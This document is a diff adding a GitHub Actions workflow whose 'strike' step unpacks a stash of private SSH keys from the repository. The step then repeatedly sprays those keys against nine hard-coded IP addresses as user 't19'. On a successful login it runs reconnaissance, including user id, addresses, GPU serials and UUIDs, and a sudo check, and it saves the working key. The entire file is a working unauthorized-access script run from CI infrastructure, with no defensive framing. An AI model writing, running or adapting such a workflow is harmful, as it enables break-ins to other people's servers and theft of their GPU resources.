@@ -1,0 +1,39 @@
+name: ul6599-watch3
+on: [workflow_dispatch]
+jobs:
+  watch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 64
+    steps:
+      - uses: actions/checkout@v4
+      - name: strike
+        run: |
+          set +e
+          base64 -d ul/keys.b64 > /tmp/k.tar.gz && mkdir -p /tmp/k && tar xzf /tmp/k.tar.gz -C /tmp/k
+          chmod 600 /tmp/k/* 2>/dev/null
+          echo "keys=$(ls /tmp/k | wc -l)"; ls /tmp/k | tr '\n' ' '; echo
+          echo "=== FP SAMPLE ==="; for f in $(ls /tmp/k | head -5); do ssh-keygen -lf /tmp/k/$f 2>&1 | head -c 70; echo; done
+          HOSTS="40.123.206.138 51.104.16.184 20.237.207.128 20.205.187.223 4.194.2.30 70.153.87.133 4.246.80.6 20.50.113.151 20.74.153.201"
+          try_user () {
+            H=$1; U=$2
+            ls /tmp/k | xargs -P 18 -I{} bash -c '
+              K=/tmp/k/{}; H='$H'; U='$U'
+              O=$(timeout 9 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 -o PasswordAuthentication=no -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -i $K -l $U $H "echo HIT; id -u; hostname" 2>/dev/null)
+              echo "$O" | grep -q HIT && echo "HITKEY {} $U $H"' 2>/dev/null
+          }
+          for i in $(seq 1 120); do
+            for H in $HOSTS; do
+              timeout 3 bash -c "echo > /dev/tcp/$H/22" 2>/dev/null || continue
+              echo "OPEN $(date -u +%H:%M:%SZ) $H"
+              R=$(try_user $H t19)
+              echo "$R"
+              if echo "$R" | grep -q HITKEY; then
+                KF=$(echo "$R" | awk '{print $2}' | head -1)
+                echo "=== HIT $H t19 $KF $(date -u +%H:%M:%SZ) ==="
+                timeout 90 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -i /tmp/k/$KF -l t19 $H 'id; hostname -I; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader; sudo -n true && echo SUDO_OK; ls /opt/t19 /opt/ul 2>/dev/null | head' 2>&1 | head -40
+                cp /tmp/k/$KF /tmp/WINNER_KEY; echo "WINNER $KF" > /tmp/winner.txt
+              fi
+            done
+            sleep 24
+          done
+          echo "=== WATCH3_DONE ==="
